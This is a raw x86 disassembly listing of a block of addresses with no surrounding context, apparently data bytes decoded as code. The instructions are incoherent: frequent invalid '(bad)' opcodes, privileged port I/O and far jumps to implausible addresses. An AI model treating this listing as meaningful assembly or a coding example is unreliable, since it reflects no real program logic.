  42aa7c:	mov    bl,0x28
  42aa7e:	xor    al,0x60
  42aa80:	push   ss
  42aa81:	mov    esi,esi
  42aa83:	xchg   ecx,eax
  42aa84:	add    eax,0xff9b119a
  42aa89:	jno    0x42aaef
  42aa8b:	pop    ds
  42aa8c:	xchg   esi,esp
  42aa8e:	sub    al,0xb1
  42aa90:	mov    DWORD PTR [edi],edi
  42aa92:	jp     0x42aa33
  42aa94:	ins    DWORD PTR es:[edi],dx
  42aa95:	and    dl,al
  42aa97:	xor    al,0x42
  42aa99:	sub    ah,BYTE PTR [edi]
  42aa9b:	mov    edx,DWORD PTR ds:0xbb95483e
  42aaa1:	or     DWORD PTR [ecx],edx
  42aaa3:	jae    0x42aa29
  42aaa5:	mov    edi,0x6911f9f
  42aaab:	mul    DWORD PTR [edi]
  42aaad:	mov    ecx,0xc7107e01
  42aab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aab3:	aad    0x7d
  42aab5:	(bad)  
  42aab6:	(bad)  
  42aab7:	sbb    ch,bh
  42aab9:	jae    0x42ab0d
  42aabb:	ss mov al,0x6b
  42aabe:	out    dx,al
  42aabf:	sub    BYTE PTR [ecx-0x58],dl
  42aac2:	fidivr WORD PTR [ecx-0x20ad3b70]
  42aac8:	mov    cs,ebp
  42aaca:	or     esi,DWORD PTR [ecx+eax*8]
  42aacd:	icebp  
  42aace:	lods   al,BYTE PTR ds:[esi]
  42aacf:	xchg   ecx,eax
  42aad0:	mov    cl,0x2e
  42aad2:	iret   
  42aad3:	into   
  42aad4:	fcmovb st,st(3)
  42aad6:	and    al,0xb3
  42aad8:	les    eax,FWORD PTR [ecx]
  42aada:	and    BYTE PTR [ecx+0x6b33dad0],cl
  42aae0:	xor    edi,DWORD PTR [ebx+0x3d]
  42aae3:	or     eax,0x945949ce
  42aae8:	sbb    eax,0xeb58fa85
  42aaed:	in     eax,dx
  42aaee:	neg    DWORD PTR [esi-0x7908a2d0]
  42aaf4:	clc    
  42aaf5:	add    cl,ch
  42aaf7:	jo     0x42ab0d
  42aaf9:	cs imul ebx,edx,0x7a
  42aafd:	mov    eax,ds:0xad6452be
  42ab02:	ins    DWORD PTR es:[edi],dx
  42ab03:	or     edx,ebp
  42ab05:	mov    DWORD PTR [edi-0x6f3955cb],0x2196e13
  42ab0f:	xor    edx,DWORD PTR [ebx+eiz*2]
  42ab12:	jmp    0x6eb4add8
  42ab17:	push   es
  42ab18:	sbb    DWORD PTR [ecx],esp
  42ab1a:	jmp    0x42ab89
  42ab1c:	es mov al,bh
  42ab1f:	push   esi
  42ab20:	aad    0xcd
  42ab22:	mov    ebx,0xb9f2ca20
  42ab27:	jb     0x42aba4
  42ab29:	sub    DWORD PTR [esi+ecx*8-0xb],0x4eec06e8
  42ab31:	sub    al,0x30
  42ab33:	xchg   eax,ecx
  42ab35:	adc    DWORD PTR [esi],eax
  42ab37:	rep outs dx,DWORD PTR ds:[esi]
  42ab39:	push   ecx
  42ab3a:	sbb    esp,DWORD PTR ds:0xdfb29b02
  42ab40:	push   esp
  42ab41:	stos   DWORD PTR es:[edi],eax
	...
  42abb2:	add    BYTE PTR [eax],al
  42abb4:	mov    ds:0xb788a616,eax
  42abb9:	mov    eax,0x50433faf
  42abbe:	es inc esp
  42abc0:	mov    ecx,0x726071d2
  42abc5:	lds    eax,FWORD PTR [ecx]
  42abc7:	add    dh,dh
  42abc9:	add    BYTE PTR [eax],al
  42abcb:	add    dl,bh
  42abcd:	sub    bh,BYTE PTR [edi+eiz*8]
  42abd0:	in     al,0xbc
  42abd2:	or     al,0xbf
  42abd4:	mov    ah,0xf4
  42abd6:	mov    ecx,0x93f62b4c
  42abdb:	jae    0x42abae
  42abdd:	daa    
  42abde:	and    ebp,ebp
  42abe0:	ficomp DWORD PTR ds:[edx]
  42abe3:	(bad)  
  42abe5:	(bad)  
  42abe6:	pop    esp
  42abe7:	add    DWORD PTR ds:0x9b00c1dd,eax
  42abed:	ins    BYTE PTR es:[edi],dx
  42abee:	push   edx
  42abef:	jbe    0x42ac3f
  42abf1:	arpl   sp,si
  42abf3:	or     dx,dx
  42abf6:	sbb    cl,al
  42abf8:	sbb    BYTE PTR [ecx+edx*1-0x31],dl
  42abfc:	addr16 out dx,al
  42abfe:	(bad)  
  42abff:	test   al,0xbf
  42ac01:	xchg   DWORD PTR [ebx+0xb],ebp
  42ac04:	and    ecx,ebp
  42ac06:	arpl   WORD PTR [eax+0x43],dx
  42ac09:	xchg   BYTE PTR [ebx+0x340696f5],bh
  42ac0f:	inc    eax
  42ac10:	push   esp
  42ac11:	and    eax,0x8d7d6b38
  42ac16:	dec    ebp
  42ac17:	out    dx,al
  42ac18:	mov    eax,ds:0x1f17a5ce
  42ac1d:	xor    esp,DWORD PTR [eax]
  42ac1f:	cmp    eax,0x5dee10f6
  42ac24:	sub    ch,bh
  42ac26:	mov    es,WORD PTR [eax]
  42ac28:	pop    eax
  42ac29:	mov    ds:0xf661dbb2,eax
  42ac2e:	xchg   bh,bl
  42ac30:	cmp    al,0xf1
  42ac32:	(bad)  
  42ac33:	cmp    DWORD PTR [esi-0x2f],ebx
  42ac36:	pop    DWORD PTR [ebp-0x5c2636c4]
  42ac3c:	adc    BYTE PTR [edx+ebp*1+0x50],0x28
  42ac41:	jmp    0x42acc1
  42ac43:	pop    ecx
  42ac44:	adc    BYTE PTR [edx],dl
  42ac46:	mov    ebp,0x9b3fc59f
  42ac4b:	jmp    0x41ec749c
  42ac50:	cs pop ss
  42ac52:	sub    edx,DWORD PTR [ebx+0x5a]
  42ac55:	lock aad 0x50
  42ac58:	scas   al,BYTE PTR es:[edi]
  42ac59:	clc    
  42ac5a:	jge    0x42ac7c
  42ac5c:	out    dx,al
  42ac5d:	push   ss
  42ac5e:	(bad)  
  42ac5f:	test   eax,0x9fe8959a
  42ac64:	pushf  
  42ac65:	imul   edi,ecx,0x604723a9
  42ac6b:	shl    DWORD PTR [eax+0x2d],0x24
  42ac6f:	add    ebp,DWORD PTR [ebx]
  42ac71:	cwde   
  42ac72:	mov    bl,0xa
  42ac74:	add    bl,BYTE PTR [edi-0x6286ae42]
  42ac7a:	mov    esi,0x385f45c9
  42ac7f:	loop   0x42ac66
  42ac81:	fistp  WORD PTR gs:0x208f28a1
  42ac88:	mov    edx,0x2f255c59
  42ac8d:	in     al,0xe8
  42ac8f:	push   esp
  42ac90:	xor    BYTE PTR [ebp+0x52],0xdc
  42ac94:	add    eax,0x4c84f113
  42ac99:	retf   
  42ac9a:	dec    ebp
  42ac9b:	mov    dh,cl
  42ac9d:	adc    BYTE PTR [esi-0x6d],bh
  42aca0:	jge    0x42acff
  42aca2:	je     0x42ad14
  42aca4:	test   al,0x75
  42aca6:	mov    al,ds:0x375d2856
  42acab:	(bad)  [edi-0x15adb19b]
  42acb1:	stc    
  42acb2:	mov    cl,0x4b
  42acb4:	add    dh,ch
  42acb6:	loop   0x42ac7d
  42acb8:	push   esi
  42acb9:	pusha  
  42acba:	jno    0x42ac77
  42acbc:	inc    ebp
  42acbd:	mov    al,0x33
  42acbf:	dec    esp
  42acc0:	or     BYTE PTR [edx],ch
	...
  42ad32:	add    BYTE PTR [eax],al
  42ad34:	fwait
  42ad35:	mov    bh,0xc4
  42ad37:	or     al,0xec
  42ad39:	jg     0x42ad16
  42ad3b:	mov    bh,0xb7
  42ad3d:	sub    DWORD PTR [eax],ebx
  42ad3f:	comiss xmm3,DWORD PTR [edx]
  42ad42:	int3   
  42ad43:	xchg   BYTE PTR [eax-0x3a],ch
  42ad46:	add    DWORD PTR [eax],eax
  42ad48:	test   BYTE PTR [eax],0x0
  42ad4b:	add    BYTE PTR [esi-0x65],bl
  42ad4e:	xchg   ebp,eax
  42ad4f:	mov    ebx,0xe69ade9a
  42ad54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad55:	out    0xc8,al
  42ad57:	push   ds
  42ad58:	call   0x45305d8f
  42ad5d:	(bad)  
  42ad5e:	jp     0x42ad91
  42ad60:	icebp  
  42ad61:	stc    
  42ad62:	fs jae 0x42ad1f
  42ad65:	mov    al,0xa0
  42ad67:	leave  
  42ad68:	sub    eax,0x4e86171e
  42ad6d:	or     edi,DWORD PTR [edx-0x36ef8c8d]
  42ad73:	pop    esi
  42ad74:	pop    esp
  42ad75:	shl    DWORD PTR [eax+ecx*1-0x49],0x40
  42ad7a:	out    0x6b,al
  42ad7c:	jbe    0x42ad54
  42ad7e:	pop    eax
  42ad7f:	stc    
  42ad80:	pushf  
  42ad81:	pop    es
  42ad82:	fmul   QWORD PTR [ecx-0x74821c2c]
  42ad88:	fisub  WORD PTR [ebx-0x7]
  42ad8b:	cmp    cl,BYTE PTR [esi+0x562010f1]
  42ad91:	xchg   esp,eax
  42ad92:	sbb    al,0xd2
  42ad94:	mov    DWORD PTR [esi+0x40],ecx
  42ad97:	iret   
  42ad98:	fdivp  st(4),st
  42ad9a:	or     DWORD PTR [esp+eiz*4+0x419e3e37],edi
  42ada1:	jp     0x42ad94
  42ada3:	and    al,0xce
  42ada5:	into   
  42ada6:	repnz xor al,0x9f
  42ada9:	inc    ebx
  42adaa:	mul    edi
  42adac:	lods   eax,DWORD PTR ds:[esi]
  42adad:	xchg   ecx,eax
  42adae:	push   ds
  42adaf:	inc    esp
  42adb0:	inc    esi
  42adb1:	bound  ebx,QWORD PTR [ecx+0x28]
  42adb4:	mov    eax,0xf4f3ac69
  42adb9:	sbb    BYTE PTR [edi+0x34],bh
  42adbc:	test   BYTE PTR [ebp+0x3a],ch
  42adbf:	out    dx,eax
  42adc0:	dec    ecx
  42adc1:	or     al,0xc5
  42adc3:	cmc    
  42adc4:	xchg   edx,eax
  42adc5:	add    ah,al
  42adc7:	add    al,0x4
  42adc9:	mov    al,ds:0x1ac41341
  42adce:	out    0x24,eax
  42add0:	mov    WORD PTR [ecx-0x4f],?
  42add3:	ss sub al,0x2d
  42add6:	inc    eax
  42add7:	fwait
  42add8:	ror    DWORD PTR [ebx],cl
  42adda:	mov    ebx,ecx
  42addc:	mov    esp,0x5cc04e13
  42ade1:	ins    BYTE PTR es:[edi],dx
  42ade2:	push   ds
  42ade3:	pop    edi
  42ade4:	lock adc BYTE PTR [edi],ah
  42ade7:	sbb    al,0x7a
  42ade9:	adc    al,0x8a
  42adeb:	add    BYTE PTR [esi-0x9],bh
  42adee:	call   0x51098971
  42adf3:	cmp    al,0xc0
  42adf5:	pop    es
  42adf6:	and    al,0xec
  42adf8:	push   0x93b715da
  42adfd:	dec    esi
  42adfe:	and    DWORD PTR [ebx],edx
  42ae00:	mov    ds:0xe12f6feb,al
  42ae05:	push   esi
  42ae06:	sub    bl,BYTE PTR [ecx]
  42ae08:	int    0x9b
  42ae0a:	add    ch,BYTE PTR [ecx-0x1fede22d]
  42ae10:	mov    al,BYTE PTR [edx+ebx*2+0x35b26af0]
  42ae17:	sub    ah,BYTE PTR [esi-0x7784c4f2]
  42ae1d:	ins    DWORD PTR es:[edi],dx
  42ae1e:	jecxz  0x42ae78
  42ae20:	sub    BYTE PTR [esi-0x75],bh
  42ae23:	jecxz  0x42ae95
  42ae25:	xlat   BYTE PTR ds:[ebx]
  42ae26:	cdq    
  42ae27:	jecxz  0x42ae4d
  42ae29:	add    al,0x8f
  42ae2b:	vmptrst QWORD PTR [ebp-0x2b]
  42ae2f:	inc    ebx
  42ae30:	mov    edi,0xdba4e9fb
  42ae35:	frstor [edi]
  42ae37:	shl    BYTE PTR [ebx+ebx*8-0x4d703705],1
  42ae3e:	mov    edx,0x72ac0b
	...
  42aeb3:	add    BYTE PTR [ecx],dh
  42aeb5:	inc    ebp
  42aeb6:	enter  0xfc06,0x8f
  42aeba:	push   DWORD PTR [edi+0x59]
  42aebd:	out    dx,eax
  42aebe:	adc    dl,al
  42aec0:	push   esi
  42aec1:	lock outs dx,BYTE PTR ds:[esi]
  42aec3:	dec    edi
  42aec4:	pop    esi
  42aec5:	mov    DWORD PTR [ecx],0xf600
  42aecb:	add    ch,ah
  42aecd:	jnp    0xccf682a5
  42aed3:	fs in  al,0x51
  42aed6:	inc    ebx
  42aed7:	jl     0x42af1a
  42aed9:	call   0xee124e61
  42aede:	dec    esi
  42aedf:	int    0x50
  42aee1:	cmp    eax,eax
  42aee3:	rcr    DWORD PTR [ebx],0x71
  42aee6:	push   cs
  42aee7:	mov    dl,0xa7
  42aee9:	push   ds
  42aeea:	fld    TBYTE PTR [ecx]
  42aeec:	xor    BYTE PTR [edx],bh
  42aeee:	call   0x7c16:0xd8c0be87
  42aef5:	lods   eax,DWORD PTR ds:[esi]
  42aef6:	sbb    esp,DWORD PTR [esi]
  42aef8:	adc    eax,0x6b05a26b
  42aefd:	inc    edi
  42aefe:	add    al,0x82
  42af00:	stos   BYTE PTR es:[edi],al
  42af01:	out    0x6d,eax
  42af03:	mov    edi,0x55df9804
  42af08:	push   esi
  42af09:	pop    eax
  42af0a:	pop    esi
  42af0b:	push   es
  42af0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42af0d:	pop    edx
  42af0e:	xchg   ecx,eax
  42af0f:	xchg   esi,eax
  42af10:	fbld   TBYTE PTR [esi]
  42af12:	ret    0xb5a2
  42af15:	adc    BYTE PTR [ecx+0x59],cl
  42af18:	and    al,0x99
  42af1a:	ins    DWORD PTR es:[edi],dx
  42af1b:	sahf   
  42af1c:	(bad)  
  42af1d:	mov    eax,0x23e22ce8
  42af22:	xor    ebp,ecx
  42af24:	mov    edx,0x698ca0d2
  42af29:	mov    eax,0x74cee0e2
  42af2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af2f:	inc    edx
  42af30:	push   cs
  42af31:	sbb    DWORD PTR [edi],ecx
  42af33:	enter  0x504c,0x5c
  42af37:	in     al,0xc8
  42af39:	adc    eax,0x10d2a679
  42af3e:	ret    
  42af3f:	sar    edx,1
  42af41:	out    dx,eax
  42af42:	fwait
  42af43:	sbb    BYTE PTR [ebp+0x3a1aecf7],bl
  42af49:	shl    BYTE PTR [ebx],cl
  42af4b:	jne    0x42af5e
  42af4d:	pop    ss
  42af4e:	or     ebp,DWORD PTR [eax+0x763217e]
  42af54:	sub    al,0xb7
  42af56:	jmp    0xf3695123
  42af5b:	or     BYTE PTR [edx-0x2c835785],0xc2
  42af62:	or     ch,BYTE PTR [ebp-0x67]
  42af65:	push   esp
  42af66:	sahf   
  42af67:	pop    esp
  42af68:	daa    
  42af69:	pop    ebp
  42af6a:	cmp    eax,0xcd85f3be
  42af6f:	(bad)  
  42af70:	xchg   edx,eax
  42af71:	push   esi
  42af72:	mov    eax,ds:0xaa7068b7
  42af77:	xor    eax,0x3ab21c6d
  42af7c:	jl     0x42affd
  42af7e:	int    0x27
  42af80:	add    BYTE PTR [esi],dl
  42af82:	rcl    DWORD PTR [ecx],1
  42af84:	mov    BYTE PTR [esi+0x6eadd02e],bh
  42af8a:	in     al,dx
  42af8b:	xlat   BYTE PTR ds:[ebx]
  42af8c:	mov    ds:0xb3535eb5,al
  42af91:	sbb    eax,0xcbf08fae
  42af96:	mov    dl,0x33
  42af98:	stc    
  42af99:	les    esi,FWORD PTR [eax]
  42af9b:	lea    edi,[ebp+0x25]
  42af9e:	cmp    dh,BYTE PTR [ebp-0x7f8e330a]
  42afa4:	test   eax,0x74f4d8a6
  42afa9:	xor    esi,DWORD PTR [eax+eax*8]
  42afac:	test   DWORD PTR [esi],0x43f39b44
  42afb2:	sub    DWORD PTR [ecx],eax
  42afb4:	repnz push eax
  42afb6:	mov    bl,BYTE PTR [edi+0x110e7ea4]
  42afbc:	outs   dx,BYTE PTR ds:[esi]
  42afbd:	int    0x40
  42afbf:	sbb    DWORD PTR [ecx-0x44],0x0
	...
  42b033:	add    bh,dl
  42b035:	pushf  
  42b036:	shr    BYTE PTR [ebp-0x1000235],0x4c
  42b03d:	jb     0x42b001
  42b03f:	ret    0xa92d
  42b042:	mov    bh,0xf1
  42b044:	push   esp
  42b045:	enter  0x1,0xf6
  42b049:	add    BYTE PTR [eax],al
  42b04b:	add    BYTE PTR [edi+0x1dd27d65],cl
  42b051:	and    BYTE PTR [edi+0x6b],bl
  42b054:	mov    bh,0xfd
  42b056:	xchg   BYTE PTR [eax+0x5c],dl
  42b059:	rcr    DWORD PTR [edi-0x21f5d0c4],0x59
  42b060:	mov    dl,0xc5
  42b062:	scas   eax,DWORD PTR es:[edi]
  42b063:	or     al,0x5c
  42b065:	repnz push esp
  42b067:	cmp    DWORD PTR [eax-0x1b],ebx
  42b06a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b06b:	xlat   BYTE PTR ds:[ebx]
  42b06c:	mov    ecx,0x7b6c6bd6
  42b071:	pop    es
  42b072:	loope  0x42affc
  42b074:	in     al,dx
  42b075:	fiadd  WORD PTR [ecx+0x3d6fd334]
  42b07b:	loopne 0x42b078
  42b07d:	out    0x2d,al
  42b07f:	xchg   edi,eax
  42b080:	push   ebx
  42b081:	popa   
  42b082:	daa    
  42b083:	outs   dx,BYTE PTR ds:[esi]
  42b084:	push   eax
  42b085:	pop    ebx
  42b086:	pop    esi
  42b087:	sbb    esp,DWORD PTR [ebx+0x7137fa1]
  42b08d:	rcr    cl,cl
  42b08f:	jmp    0xccda:0xd7064054
  42b096:	lahf   
  42b097:	pop    ecx
  42b098:	pop    ds
  42b099:	and    al,0x6b
  42b09b:	mov    WORD PTR [edi],?
  42b09d:	cmp    al,0xa5
  42b09f:	push   cs
  42b0a0:	pop    esp
  42b0a1:	push   es
  42b0a2:	gs js  0x42b09b
  42b0a5:	clc    
  42b0a6:	dec    edx
  42b0a7:	daa    
  42b0a8:	cmp    cl,ch
  42b0aa:	push   ds
  42b0ab:	mov    al,0x5a
  42b0ad:	mov    ecx,esi
  42b0af:	sbb    DWORD PTR [ebx-0x7e16aead],ecx
  42b0b5:	js     0x42b04a
  42b0b7:	mov    edi,0x4ec98784
  42b0bc:	lods   al,BYTE PTR ds:[esi]
  42b0bd:	js     0x42b13c
  42b0bf:	jge    0x42b059
  42b0c1:	js     0x42b12f
  42b0c3:	fs sub al,0x63
  42b0c6:	sbb    al,0x70
  42b0c8:	push   edi
  42b0c9:	jge    0x42b0be
  42b0cb:	popa   
  42b0cc:	mov    esp,0x4d356444
  42b0d1:	pop    ds
  42b0d2:	leave  
  42b0d3:	cmp    dl,bh
  42b0d5:	xlat   BYTE PTR ds:[ebx]
  42b0d6:	mov    eax,ds:0x9fbd2c16
  42b0db:	push   ecx
  42b0dc:	push   ebp
  42b0dd:	popa   
  42b0de:	mov    ah,0x69
  42b0e0:	clc    
  42b0e1:	das    
  42b0e2:	loopne 0x42b127
  42b0e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b0e5:	scas   eax,DWORD PTR es:[edi]
  42b0e6:	cmp    DWORD PTR [eax+0x326d3755],eax
  42b0ec:	sbb    eax,0xd888254
  42b0f1:	cmp    al,BYTE PTR gs:[eax]
  42b0f4:	bound  esp,QWORD PTR [ebx-0x3c]
  42b0f7:	das    
  42b0f8:	sub    eax,0xfd13fb75
  42b0fd:	inc    edx
  42b0fe:	cs mov edx,0x516f11d4
  42b104:	dec    edx
  42b105:	add    al,0x14
  42b107:	jmp    0xa30160c7
  42b10c:	pop    ebx
  42b10d:	lea    ebp,[ebx+0x27fe3bba]
  42b113:	out    0xd5,al
  42b115:	jo     0x42b167
  42b117:	mov    ebx,0x588110b9
  42b11c:	push   ebp
  42b11d:	ins    DWORD PTR es:[edi],dx
  42b11e:	sbb    ch,bl
  42b120:	add    al,0x1f
  42b122:	cmp    BYTE PTR fs:[esi-0x719df714],cl
  42b129:	daa    
  42b12a:	mov    ds:0xf2e3aef7,eax
  42b12f:	jge    0x42b0b4
  42b131:	imul   edi,DWORD PTR [ecx-0xd],0xffffffec
  42b135:	jmp    0x223e7801
  42b13a:	out    dx,eax
  42b13b:	loop   0x42b1b2
  42b13d:	out    dx,al
  42b13e:	mov    dh,0xe8
  42b140:	cmc    
  42b141:	clc    
	...
  42b1b2:	add    BYTE PTR [eax],al
  42b1b4:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42b1ba:	scas   eax,DWORD PTR es:[edi]
  42b1bb:	mov    bh,0x27
  42b1bd:	xchg   ecx,eax
  42b1be:	push   esp
  42b1bf:	outs   dx,DWORD PTR ds:[esi]
  42b1c0:	adc    bl,ch
  42b1c2:	sahf   
  42b1c3:	cmp    eax,0x1c94a
  42b1c8:	test   BYTE PTR [eax],0x0
  42b1cb:	add    al,bh
  42b1cd:	mov    bh,0xf7
  42b1cf:	adc    BYTE PTR [ebp+0x35635273],0xab
  42b1d6:	and    BYTE PTR [esi],bl
  42b1d8:	out    0xcc,al
  42b1da:	ins    DWORD PTR es:[edi],dx
  42b1db:	xchg   ebx,eax
  42b1dc:	pop    eax
  42b1dd:	mov    ds:0x85d222e4,eax
  42b1e2:	adc    BYTE PTR [ecx-0x29571ed2],dl
  42b1e8:	xchg   DWORD PTR [esi-0x219252d9],eax
  42b1ee:	ds (bad) 
  42b1f0:	aaa    
  42b1f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b1f2:	sub    al,BYTE PTR [edx-0x4f]
  42b1f5:	jbe    0x42b26e
  42b1f7:	nop
  42b1f8:	xor    al,0x2c
  42b1fa:	push   ebp
  42b1fb:	in     al,0xdd
  42b1fd:	neg    BYTE PTR [eax+0x4b]
  42b200:	sbb    DWORD PTR [esi+0x66],edi
  42b203:	jno    0x42b1c2
  42b205:	icebp  
  42b206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b207:	test   al,0x3b
  42b209:	push   0x45c948d9
  42b20e:	mov    dh,0x1a
  42b210:	fld    TBYTE PTR [esi+eiz*2]
  42b213:	fidiv  WORD PTR [ecx-0x41]
  42b216:	lods   al,BYTE PTR ds:[esi]
  42b217:	mov    edx,0xcae0d87d
  42b21c:	inc    esi
  42b21d:	popa   
  42b21e:	sti    
  42b21f:	xor    DWORD PTR [ebp-0x29],edi
  42b222:	pop    esp
  42b223:	and    BYTE PTR ds:0x5e93446c,0x19
  42b22a:	int3   
  42b22b:	fstp   DWORD PTR [edi+0x20]
  42b22e:	cmp    edi,ecx
  42b230:	in     eax,dx
  42b231:	scas   al,BYTE PTR es:[edi]
  42b232:	outs   dx,BYTE PTR ds:[esi]
  42b233:	mov    ds:0xad86c0,al
  42b238:	pop    edx
  42b239:	nop
  42b23a:	mov    dh,0x14
  42b23d:	mov    ah,BYTE PTR [ebx+eax*2]
  42b240:	xchg   edi,eax
  42b241:	xchg   ebx,eax
  42b242:	leave  
  42b243:	pushf  
  42b244:	fwait
  42b245:	adc    DWORD PTR [esi-0x64848204],edx
  42b24b:	push   edi
  42b24c:	pop    edx
  42b24d:	and    edx,DWORD PTR [esi]
  42b24f:	cwde   
  42b250:	lea    edi,[esp+ecx*2-0x4d9cf19c]
  42b257:	and    eax,0x393b6870
  42b25c:	push   ebx
  42b25d:	test   eax,0xc38e426d
  42b262:	retf   
  42b263:	mov    WORD PTR [ebx-0x7c],cs
  42b266:	adc    eax,0xf9b4c8b9
  42b26b:	ja     0x42b212
  42b26d:	push   edx
  42b26e:	fidivr WORD PTR [eax]
  42b270:	mov    ds,WORD PTR [ecx+ebp*8+0xc95668d]
  42b277:	sbb    BYTE PTR [eax],bh
  42b279:	int    0x1d
  42b27b:	fs scas al,BYTE PTR es:[edi]
  42b27d:	int3   
  42b27e:	pop    edi
  42b27f:	test   eax,0x1beb78f3
  42b284:	inc    eax
  42b285:	xor    bh,BYTE PTR [edi]
  42b287:	cmp    eax,0x2627ddb
  42b28c:	and    BYTE PTR [ebp-0x2a],dl
  42b28f:	mov    ecx,0xe72b360c
  42b294:	popa   
  42b295:	ss daa 
  42b297:	pop    ebp
  42b298:	aad    0xe
  42b29a:	mov    ds:0x331e1a5a,al
  42b29f:	mov    edx,0x3768406e
  42b2a4:	movntps XMMWORD PTR [edi-0x708caf13],xmm5
  42b2ab:	add    dl,BYTE PTR [edi+0x598e0a84]
  42b2b1:	cdq    
  42b2b2:	add    al,0x74
  42b2b4:	dec    DWORD PTR [edi+edx*8]
  42b2b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b2b8:	pop    es
  42b2b9:	add    ah,BYTE PTR [ebx+0x75b5b783]
  42b2bf:	xor    DWORD PTR [ebx+0x8e],ebp
	...
  42b331:	add    BYTE PTR [eax],al
  42b333:	add    BYTE PTR [edi+0xe],bh
  42b336:	jne    0x42b373
  42b338:	jne    0x42b3b5
  42b33a:	jg     0x42b38a
  42b33c:	out    0x79,eax
  42b33e:	and    DWORD PTR [eax-0x3c],esi
  42b341:	lods   al,BYTE PTR ds:[esi]
  42b342:	int    0xb1
  42b344:	inc    eax
  42b345:	retf   0x1
  42b348:	test   BYTE PTR [eax],0x0
  42b34b:	add    BYTE PTR [eax+0x472e60a4],al
  42b351:	mov    esp,0x81f50fe7
  42b356:	inc    esp
  42b357:	outs   dx,DWORD PTR ds:[esi]
  42b358:	test   al,0x50
  42b35a:	sbb    al,0xfe
  42b35c:	inc    esi
  42b35d:	nop
  42b35e:	into   
  42b35f:	jae    0x42b3b7
  42b361:	js     0x42b317
  42b363:	mov    bh,0x61
  42b365:	xchg   ecx,eax
  42b366:	adc    eax,DWORD PTR [edx]
  42b368:	inc    ebp
  42b369:	cmc    
  42b36a:	fild   QWORD PTR [edi+0x15a60857]
  42b370:	xor    eax,DWORD PTR [edx-0x3b]
  42b373:	lds    ebp,FWORD PTR [edi-0x4decd29f]
  42b379:	push   esp
  42b37a:	cmc    
  42b37b:	out    0xa8,eax
  42b37d:	mov    dl,0xe5
  42b37f:	rcl    DWORD PTR [edx+0x20d0f39c],0xfb
  42b386:	addr16 call 0x5f49878
  42b38c:	add    DWORD PTR [ecx+0x40],ebx
  42b38f:	xchg   ecx,eax
  42b390:	jle    0x42b320
  42b392:	das    
  42b393:	and    bl,al
  42b395:	xlat   BYTE PTR ds:[ebx]
  42b396:	in     al,0xe2
  42b398:	test   DWORD PTR [ebx-0x44],eax
  42b39b:	xor    al,0x6f
  42b39d:	push   edx
  42b39e:	out    dx,al
  42b39f:	fldenv [eax+edi*2]
  42b3a2:	lock and DWORD PTR [esi+0x2125d086],ebx
  42b3a9:	or     BYTE PTR [edx-0x7f],al
  42b3ac:	rol    DWORD PTR [ebp+0x6b],1
  42b3af:	(bad)  
  42b3b0:	sub    al,0x32
  42b3b2:	dec    ebp
  42b3b3:	stos   DWORD PTR es:[edi],eax
  42b3b4:	loope  0x42b3c4
  42b3b6:	mov    al,BYTE PTR [ebp+0x1b]
  42b3b9:	dec    eax
  42b3ba:	in     al,0xbf
  42b3bc:	dec    ebx
  42b3bd:	pop    esi
  42b3be:	pop    esi
  42b3bf:	xor    eax,0x9c1b333d
  42b3c4:	adc    eax,0x8cbfdd33
  42b3c9:	mov    eax,DWORD PTR [ecx-0x39f8c3a2]
  42b3cf:	das    
  42b3d0:	jae    0x42b3c3
  42b3d2:	ror    BYTE PTR [ebp-0x507f8acb],cl
  42b3d8:	jecxz  0x42b3ff
  42b3da:	add    eax,0xb98fc5a4
  42b3df:	dec    ebp
  42b3e0:	or     al,0x2
  42b3e2:	loope  0x42b36a
  42b3e4:	mov    dh,0x9b
  42b3e6:	pop    ecx
  42b3e7:	ret    
  42b3e8:	or     DWORD PTR [edx+0x35],edi
  42b3eb:	mov    al,ds:0xebe0c431
  42b3f0:	sub    dl,BYTE PTR fs:[esp+esi*4+0x6]
  42b3f5:	test   eax,0xc9f2876e
  42b3fa:	js     0x42b40e
  42b3fc:	push   edi
  42b3fd:	in     al,0xc9
  42b3ff:	js     0x42b39e
  42b401:	rol    BYTE PTR ds:0xe2e597c8,0x34
  42b408:	shl    DWORD PTR [edi-0x610747b8],0x30
  42b40f:	sbb    DWORD PTR [ebp+eiz*8-0x3],ebp
  42b413:	stc    
  42b414:	ss ja  0x42b441
  42b417:	add    eax,0xd540cc9d
  42b41c:	in     eax,0x55
  42b41e:	je     0x42b458
  42b420:	in     al,dx
  42b421:	mov    al,0xdf
  42b423:	stos   BYTE PTR es:[edi],al
  42b424:	inc    esp
  42b425:	mov    BYTE PTR [esi+0x20],bl
  42b428:	clc    
  42b429:	imul   edx,DWORD PTR ds:0x9bcf5787,0xffffff8c
  42b430:	jbe    0x42b3bd
  42b432:	jmp    0x42b41e
  42b434:	enter  0x50e0,0x81
  42b438:	xchg   esp,eax
  42b439:	test   eax,0xea572349
  42b43e:	cli    
  42b43f:	imul   ebp,DWORD PTR [edx],0x90
	...
  42b4b1:	add    BYTE PTR [eax],al
  42b4b3:	add    BYTE PTR [eax],bl
  42b4b5:	dec    edi
  42b4b6:	pop    ss
  42b4b7:	mov    ecx,0xefbef957
  42b4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4bd:	fstp   QWORD PTR [esi+0x5]
  42b4c0:	std    
  42b4c1:	jae    0x42b4d0
  42b4c3:	adc    eax,0x1cb36
  42b4c8:	test   BYTE PTR [eax],0x0
  42b4cb:	add    ah,al
  42b4cd:	test   BYTE PTR [ebx+0x25],dh
  42b4d0:	bound  esp,QWORD PTR [ebx]
  42b4d2:	jbe    0x42b52e
  42b4d4:	or     al,0xaa
  42b4d6:	jns    0x42b53f
  42b4d8:	je     0x42b507
  42b4da:	outs   dx,BYTE PTR ds:[esi]
  42b4db:	cdq    
  42b4dc:	pop    edi
  42b4dd:	ds jmp 0xbc7ea7dc
  42b4e3:	in     eax,0x1f
  42b4e5:	push   edx
  42b4e6:	aam    0x7f
  42b4e8:	rcr    BYTE PTR [ebx+esi*4+0x6b],cl
  42b4ec:	xor    eax,0x6e34c752
